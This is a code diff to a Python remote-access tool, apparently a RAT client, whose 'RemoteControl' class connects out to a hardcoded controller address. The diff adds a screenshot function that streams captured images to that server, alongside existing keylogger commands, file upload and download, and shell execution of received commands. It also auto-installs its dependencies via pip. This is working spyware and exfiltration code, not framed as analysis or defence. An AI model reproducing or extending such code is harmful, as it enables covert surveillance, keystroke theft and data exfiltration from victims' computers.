@@ -13,10 +13,12 @@ try:
     import json
     import subprocess
     import os
+    import mss
     from pynput import keyboard
 except ModuleNotFoundError:
     from subprocess import call
-    modules = ["pynput"]
+
+    modules = ["pynput", "mss"]
     call("pip install " + ' '.join(modules), shell=True)
 
 
@@ -113,9 +115,19 @@ class RemoteControl:
         finally:
             self.server_socket.settimeout(None)
 
-    def execute_command(self, command):
-        # Execute command logic
-        pass
+    def screen_shot(self):
+        time.sleep(0.25)
+        with mss.mss() as sct:
+            # Capture a screenshot
+            screenshot = sct.shot(output='screenshot.png')
+            # Read and send the screenshot as chunks
+            with open(screenshot, "rb") as image_file:
+                while True:
+                    chunk = image_file.read(1024)
+                    if not chunk:
+                        break
+                    self.server_socket.send(chunk)
+                self.server_socket.send(b"END_OF_IMAGE")
 
     def main_loop(self):
         while True:
@@ -132,25 +144,36 @@ class RemoteControl:
                         self.connection_died = 1
                         break
                 elif command == 'clear':
-                    pass
+                    continue
 
                 elif command[:3] == 'cd ':
                     os.chdir(command[3:])
+                    continue
 
                 elif command == 'keyscan_start':
                     self.keylogger_active = True
                     self.active_keylogger_listener = True
                     print("Keylogger started.")
+                    continue
+
                 elif command == 'keyscan_stop':
                     self.keylogger_active = False
                     print("Keylogger stopped.")
+                    continue
 
                 elif command.startswith('download'):
                     # upload to server
                     self.upload_file(command[9:])
+                    continue
+
                 elif command.startswith('upload'):
                     # download from server
                     self.download_file(command[7:])
+                    continue
+
+                elif command.startswith('screenshot'):
+                    self.screen_shot()
+                    continue
 
                 else:
                     # Execute the command with shell and capture the output
@@ -169,7 +192,7 @@ class RemoteControl:
 
 
 if __name__ == "__main__":
-    server = RemoteControl('192.168.0.0', 5555)  # enter server ip and port
+    server = RemoteControl('192.168.1.231', 5555)
     server.connect_to_server()
 
     main_thread = threading.Thread(target=server.main_loop)
